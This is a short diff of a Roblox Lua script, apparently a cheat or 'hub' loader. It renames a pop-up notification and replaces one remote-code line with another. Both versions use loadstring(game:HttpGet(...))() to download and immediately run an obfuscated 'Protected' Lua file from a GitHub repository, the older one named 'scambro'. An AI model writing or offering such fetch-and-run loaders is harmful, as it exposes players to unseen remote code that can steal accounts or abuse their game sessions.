@@ -1,7 +1,7 @@
 game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = "Myiev hub", -- Required
+	Title = "ik im bored", -- Required
 	Text = "Loaded", -- Required
 	Icon = "rbxassetid://1404188196" -- Optional
 })
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/yieviro92creepy/scambro/main/Protected_5385879580616726.lua.txt'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/yieviro92creepy/Updateday/main/Protected_2541060932770049.lua.txt'))()
